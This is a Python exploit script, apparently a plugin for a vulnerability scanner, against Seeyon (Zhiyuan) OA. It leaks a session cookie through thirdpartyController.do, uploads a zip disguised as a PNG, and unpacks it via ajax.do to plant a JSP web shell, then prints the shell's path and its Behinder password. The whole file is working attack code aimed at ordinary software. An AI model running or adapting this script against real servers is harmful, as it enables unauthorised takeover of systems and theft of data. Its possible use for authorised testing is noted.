import requests
import re
from bs4 import BeautifulSoup
import logging
import base64
import time
import os

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        header1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data1 = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
        logging.captureWarnings(True)
        gf2 = requests.post(url + 'seeyon/thirdpartyController.do', data=data1,cookies=s_cookie, headers=header1, proxies=proxies,verify=False,timeout=5)
        if gf2.status_code==200 and "a8genius.do" in gf2.text and 'set-cookie' in str(gf2.headers).lower():
            cookies = requests.utils.dict_from_cookiejar(gf2.cookies)
            cookie = cookies['JSESSIONID']
            files = [('file1', ('test.png', open(os.getcwd()+'\POC\TEST233.zip', 'rb'), 'image/png'))]
            header = {'Cookie': 'JSESSIONID=%s' % cookie}
            data2 = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                    'isEncrypt': "0"}
            logging.captureWarnings(True)
            gf3=requests.post(url+'seeyon/fileUpload.do?method=processUpload', data=data2, files=files,cookies=s_cookie, headers=header, proxies=proxies, verify=False,timeout=5)
            firename = re.findall('fileurls=fileurls\+","\+\'(.+)\'', gf3.text, re.I)
            if len(firename) == 0:
                uia = "[-]漏洞不存在"
            else:
                nowtime = time.strftime('%Y-%m-%d')
                data3 = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + nowtime + '%22%2C%22' + firename[0] + '%22%5D'
                header['Content-Type'] = 'application/x-www-form-urlencoded'
                gf4 = requests.post(url + "seeyon/ajax.do",data=data3,cookies=s_cookie,header=header,proxies=proxies, verify=False,timeout=5)
                if gf4.status_code==500:
                    uia = '[+]漏洞存在\n%seeyon/common/designer/pageLayout/test233.jsp\n冰蝎密码为：rebeyond' % (url)
                else:
                    uia = "[-]漏洞不存在-解压失败"
        else:
            uia = "[-]漏洞不存在"
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 致远OA session泄露&&文件上传getshell ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)